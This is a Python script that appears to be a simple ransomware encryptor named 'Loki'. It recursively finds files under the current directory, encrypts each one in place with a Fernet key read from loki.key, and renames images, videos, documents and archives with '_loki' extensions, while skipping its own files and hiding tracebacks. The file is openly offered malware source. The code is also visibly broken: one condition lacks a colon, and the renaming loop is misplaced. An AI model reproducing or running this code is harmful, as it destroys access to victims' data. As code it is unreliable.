# Imports.
import sys
import os
from pathlib import Path
from cryptography.fernet import Fernet
from colorama import Fore # For text colour.

# Hide tracebacks - change to 1 for dev mode.
sys.tracebacklimit = 0

# Discovery.
files = [] # Creates a files array.

def findFiles(path):
    dirs = [] # Creates a directory array.
    print("---> source dir |", path) # Prints when it hits a source for new sub-directories.
    for file in os.listdir(path):
        filePath = path + "/" + file
        if file == "encryptor.py" or file == "decryptor.py" or file == "loki.key":
            continue

        if not os.path.isfile(filePath):
            dirs.append(filePath)
            continue

        print("--> Found file |", filePath) # Prints when it finds an individual file.
        files.append(filePath)

    if dirs == []:
        return # No dirs

    for dirPath in dirs:
        print("-! Found sub-dir  |", dirPath) # Prints when it finds a sub-directory of a source.
        findFiles(dirPath)

# Encrypt/Decrypt handler.
def handleFile(filePath, key, action):
    with open(filePath, "rb") as file:
        contents = file.read()

    if action.lower() == "e":
        contents = Fernet(key).encrypt(contents)
        message = "Encrypted"
    elif action.lower() == "d":
        contents = Fernet(key).decrypt(contents)
        message = "Decrypted"
    else:
        print(f"{action} is not a valid file action")
        return

    with open(filePath, "wb") as file:
        file.write(contents)
        print(message, "|", filePath)

# Functions.
def encrypt():
    with open("loki.key", "rb") as loki_key:
        key = loki_key.read()

    # encrypt files
    for filePath in files:
        handleFile(filePath, key, "e")

        for filename in os.listdir(os.path.dirname(os.path.abspath(__file__))):
            base_file, ext = os.path.splitext(filename) # Adds loki extension manipulation to common file types.
            if ext == ".loki":
                os.rename(filename, base_file + "")
            if ext == ".png": # Image formats.
                os.rename(filename, base_file + ".png_loki")
            if ext == ".jpg":
                os.rename(filename, base_file + ".jpg_loki")
            if ext == ".jpeg":
                os.rename(filename, base_file + ".jpeg_loki")
            if ext == ".gif":
                os.rename(filename, base_file + ".gif_loki")
            if ext == ".tiff":
                os.rename(filename, base_file + ".tiff_loki")
            if ext == ".bmp":
                os.rename(filename, base_file + ".bmp_loki")
            if ext == ".svg":
                os.rename(filename, base_file + ".svg_loki")
            if ext == ".heif":
                os.rename(filename, base_file + ".heif_loki")
            if ext == ".raw":
                os.rename(filename, base_file + ".raw_loki")
            if ext == ".mp4": # Video formats.
                os.rename(filename, base_file + ".mp4_loki")
            if ext == ".wav":
                os.rename(filename, base_file + ".wav_loki")
            if ext == ".doc": # Document formats.
                os.rename(filename, base_file + ".doc_loki")
            if ext == ".docx":
                os.rename(filename, base_file + ".docx_loki")
            if ext == ".odt":
                os.rename(filename, base_file + ".odt_loki")
            if ext == ".rtf":
                os.rename(filename, base_file + ".rtf_loki")
            if ext == ".tex":
                os.rename(filename, base_file + ".tex_loki")
            if ext == ".txt":
                os.rename(filename, base_file + ".txt_loki")
            if ext == ".pdf":
                os.rename(filename, base_file + ".pdf_loki")
            if ext == ".zip": # Archive formats.
                os.rename(filename, base_file + ".zip_loki")
            if ext == ".rar"
                os.rename(filename, base_file + ".rar_loki")

def encryptor():
    # Find files in current dir, and sub dirs
    findFiles(".")
    encrypt()
    return

if __name__ == '__main__':
    encryptor()